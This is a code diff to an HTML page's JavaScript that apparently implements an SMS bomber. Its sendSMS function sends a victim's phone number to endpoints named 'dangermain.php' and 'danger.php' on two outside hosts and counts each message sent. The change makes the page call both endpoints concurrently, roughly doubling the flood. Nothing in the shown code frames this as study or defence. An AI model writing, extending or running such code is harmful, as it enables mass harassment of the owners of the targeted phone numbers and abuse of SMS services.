@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -114,9 +113,19 @@
 
             const sendSMS = async () => {
                 try {
-                    const response = await fetch(`https://abidhasannir.serv00.net/api/dangermain.php?phone=${phoneNumber}`);
-                    const result = await response.text();
-                    console.log(`SMS ${smsSentCount + 1} API Response:`, result);
+                    // Send requests to both APIs concurrently
+                    const [response1, response2] = await Promise.all([
+                        fetch(`https://abidhasannir.serv00.net/api/dangermain.php?phone=${phoneNumber}`),
+                        fetch(`https://abir.news/danger.php?phone=${phoneNumber}`)
+                    ]);
+
+                    // Wait for both API responses
+                    const result1 = await response1.text();
+                    const result2 = await response2.text();
+
+                    console.log(`SMS ${smsSentCount + 1} API Response from abidhasannir:`, result1);
+                    console.log(`SMS ${smsSentCount + 1} API Response from abir.news:`, result2);
+
                     smsSentCount++;
                     statusText.innerText = `SMS ${smsSentCount} sent successfully!`;
 
